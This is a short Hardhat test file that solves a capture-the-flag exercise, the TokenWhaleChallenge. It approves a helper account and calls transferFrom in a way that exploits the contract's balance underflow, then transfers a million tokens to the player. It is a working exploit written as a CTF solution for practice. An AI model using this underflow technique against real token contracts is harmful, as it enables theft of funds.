import { expect } from "chai";
import { ethers } from "hardhat";

describe("TokenWhaleChallenge", function () {
  it("should return true if we increase the player's token balance to over 1 million tokens", async function () {
    const [, player, helper] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory("TokenWhaleChallenge");

    const challenge = await Challenge.deploy(player.address);
    await challenge.deployed();

    const approvalTx = await challenge
      .connect(player)
      .approve(helper.address, 10 * 10 ** 8);
    await approvalTx.wait();

    // It doesn't matter who we transfer tokens to, because the contract has no
    // restrictions on this, and it doesn't affect the test to do it this way.
    const transferTx1 = await challenge
      .connect(helper)
      .transferFrom(player.address, player.address, 1);
    await transferTx1.wait();

    // It doesn't matter who we transfer tokens to, because the contract has no
    // restrictions on this, and it doesn't affect the test to do it this way.
    const transferTx2 = await challenge
      .connect(helper)
      .transfer(player.address, 10 ** 6);
    await transferTx2.wait();

    expect(await challenge.isComplete()).to.equal(true);
  });
});
